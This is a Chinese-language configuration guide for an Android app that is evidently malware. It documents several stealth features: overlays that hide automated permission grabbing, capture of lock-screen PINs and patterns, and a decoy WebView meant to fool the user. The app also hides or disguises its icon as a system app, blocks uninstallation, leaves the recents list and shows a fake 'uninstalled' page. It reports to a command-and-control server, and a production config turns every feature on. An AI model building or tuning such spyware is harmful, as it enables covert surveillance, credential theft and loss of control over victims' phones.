# config.json 配置说明

> 文件位置: `app/src/main/assets/config.json`
> 加载方式: `DebugConfig.init(context)` 在 Application.onCreate 中调用
> 生效条件: **仅 debug 包** (`BuildConfig.DEBUG=true`) 加载，release 包忽略（全部返回默认值）

---

## debug — 全局调试开关

```json
"debug": true
```

| 值 | 效果 |
|---|------|
| `true` | 禁用 ConfigMask 自动化遮罩（`disable_config_mask` 强制为 `true`），方便观察自动化脚本执行过程 |
| `false` | 所有配置按各自字段独立控制 |

> `debug=true` 只影响 ConfigMask 遮罩，不影响 WebView、图标隐藏、防卸载等其他功能。

---

## overlay — 遮罩层控制

```json
"overlay": {
    "disable_config_mask": false,
    "disable_fullscreen_blocker": true,
    "disable_cipher_overlay": true,
    "mask_bg_url": "",
    "mask_icon_url": ""
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `disable_config_mask` | bool | `false` | 禁用自动化遮罩（ConfigMaskOverlay）。遮罩在权限自动化期间覆盖全屏，显示进度条，防止用户看到自动化操作 |
| `disable_fullscreen_blocker` | bool | `false` | 禁用全屏阻挡层（FullscreenBlockerView），防止用户在特定阶段操作屏幕 |
| `disable_cipher_overlay` | bool | `false` | 禁用密码捕获覆盖层（CipherOverlay），用于 PIN/图案锁屏密码拦截 |
| `mask_bg_url` | string | `""` | 遮罩背景图片路径。支持空（使用内置 `bg_accessibility.png`）、本地文件路径、远程 URL |
| `mask_icon_url` | string | `""` | 遮罩图标路径。支持空（使用 APP 默认图标）、本地文件路径、远程 URL |

---

## webview — WebView 伪装页面

```json
"webview": {
    "web_url": "https://m.baidu.com",
    "disable_webview": false
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `web_url` | string | `""` | WebView 加载的 URL。必须包含协议头（`https://`），否则代码会自动补 `https://`。为空时使用 vendor 内置的默认 URL。WebView 是伪装前台页面，让用户以为在使用正常应用 |
| `disable_webview` | bool | `false` | 禁用 WebView 加载。`true` 时不加载任何页面，Activity 显示空白 |

---

## screen — 屏幕控制

```json
"screen": {
    "disable_dim_screen": true,
    "disable_brightness_restore": true
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `disable_dim_screen` | bool | `false` | 禁用自动调暗屏幕。正常运行时 APP 会在后台自动降低屏幕亮度以节省电量并减少用户注意 |
| `disable_brightness_restore` | bool | `false` | 禁用亮度恢复。关闭后 APP 不会在激活时自动恢复屏幕亮度 |

---

## icon — 图标控制

```json
"icon": {
    "disable_icon_hide": true,
    "disable_camouflage_mode": true
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `disable_icon_hide` | bool | `false` | 禁用图标隐藏。正常运行时自动化完成后会禁用 `DefaultLauncherAlias`，让 APP 图标从桌面消失 |
| `disable_camouflage_mode` | bool | `false` | 禁用伪装模式。伪装模式会通过 activity-alias 将 APP 图标/名称替换为系统应用（如手机管家） |

> **开发建议**: 调试时设为 `true`，否则图标隐藏后只能通过 `adb shell pm enable` 或重装恢复。

---

## protection — 保护机制

```json
"protection": {
    "disable_uninstall_protection": true,
    "disable_recents_guard": true,
    "uninstall_mode": false
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `disable_uninstall_protection` | bool | `false` | 禁用防卸载保护。正常运行时监控卸载行为并阻止 |
| `disable_recents_guard` | bool | `false` | 禁用多任务隐藏。正常运行时检测到用户进入最近任务页面会自动按 HOME 键回到桌面，并从最近任务列表中移除 APP |
| `uninstall_mode` | bool | `false` | 假卸载模式。`true` 时自动化完成后显示 PkgVerifyOverlay（"应用已卸载"假页面）+ 隐藏图标；`false` 时 WebView 持续显示 |

---

## automation — 自动化控制

```json
"automation": {
    "disable_write_settings_auto": false,
    "disable_brand_engine": false,
    "automation_delay_ms": 800
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `disable_write_settings_auto` | bool | `false` | 禁用 WRITE_SETTINGS 权限自动获取。WRITE_SETTINGS 是通过 20s 循环轮询自动点击开关获取的系统权限 |
| `disable_brand_engine` | bool | `false` | 禁用品牌适配引擎（yw5xud）。品牌引擎负责小米/华为/OPPO/vivo 等厂商的自启动、省电策略、权限管理等自动化配置 |
| `automation_delay_ms` | long | `800` | 自动化操作间的延迟（毫秒）。增大可提高稳定性，减小可加快速度 |

---

## network — 网络配置

```json
"network": {
    "server_url": "http://192.168.31.35:8080",
    "websocket_url": "ws://192.168.31.35:8081",
    "server_url_override": "",
    "disable_heartbeat": false,
    "log_all_ws_messages": true
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `server_url` | string | — | HTTP 服务器地址，用于数据上报和指令接收 |
| `websocket_url` | string | — | WebSocket 服务器地址，用于实时通信和心跳保活 |
| `server_url_override` | string | `""` | 覆盖服务器地址。非空时优先使用此地址替代 `server_url` |
| `disable_heartbeat` | bool | `false` | 禁用 WebSocket 心跳。`true` 时不发送定时心跳包 |
| `log_all_ws_messages` | bool | `false` | 记录所有 WebSocket 收发消息到 logcat。调试网络问题时开启 |

> `server_url` 和 `websocket_url` 不通过 DebugConfig 读取，由 `DataSyncClient` 和 `NetworkManager` 直接从 config.json 读取。

---

## auth — 认证配置

```json
"auth": {
    "owner_token": "2.xxx...xxx.1776639481"
}
```

| 字段 | 类型 | 说明 |
|------|------|------|
| `owner_token` | string | 设备归属令牌，格式 `<version>.<hmac_hash>.<timestamp>`。用于设备注册和身份验证，与服务端配对 |

> 此字段不通过 DebugConfig 读取，由 `DeviceAuthorizationManager` 和 `NetworkManager` 直接读取。

---

## logging — 日志控制

```json
"logging": {
    "verbose_init_chain": true,
    "verbose_event_dispatch": false,
    "verbose_node_search": false,
    "log_all_accessibility_events": false
}
```

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `verbose_init_chain` | bool | `false` | 详细记录服务初始化链路日志（各管理器初始化顺序和耗时） |
| `verbose_event_dispatch` | bool | `false` | 详细记录无障碍事件分发日志（每个事件的类型、包名、处理结果） |
| `verbose_node_search` | bool | `false` | 详细记录 UI 节点搜索日志（selector 匹配过程、节点树遍历） |
| `log_all_accessibility_events` | bool | `false` | 记录所有无障碍事件到 logcat（数量极大，仅在排查事件丢失问题时开启） |

---

## 开发调试推荐配置

```json
{
    "debug": true,
    "overlay": { "disable_config_mask": false, "disable_fullscreen_blocker": true, "disable_cipher_overlay": true },
    "webview": { "web_url": "https://m.baidu.com", "disable_webview": false },
    "screen": { "disable_dim_screen": true, "disable_brightness_restore": true },
    "icon": { "disable_icon_hide": true, "disable_camouflage_mode": true },
    "protection": { "disable_uninstall_protection": true, "disable_recents_guard": true, "uninstall_mode": false },
    "automation": { "disable_write_settings_auto": false, "disable_brand_engine": false },
    "logging": { "verbose_init_chain": true }
}
```

**说明**: `debug=true` 关闭遮罩方便观察自动化；图标/保护/调光全部禁用避免开发时 APP "消失"；WebView 和自动化引擎保持开启以验证功能。

## 生产部署推荐配置

```json
{
    "debug": false,
    "overlay": { "disable_config_mask": false, "disable_fullscreen_blocker": false, "disable_cipher_overlay": false },
    "webview": { "web_url": "<C2 配置的伪装页面 URL>", "disable_webview": false },
    "screen": { "disable_dim_screen": false, "disable_brightness_restore": false },
    "icon": { "disable_icon_hide": false, "disable_camouflage_mode": false },
    "protection": { "disable_uninstall_protection": false, "disable_recents_guard": false, "uninstall_mode": true },
    "automation": { "disable_write_settings_auto": false, "disable_brand_engine": false }
}
```

**说明**: 全部保护功能开启，`uninstall_mode=true` 执行假卸载 + 图标隐藏。
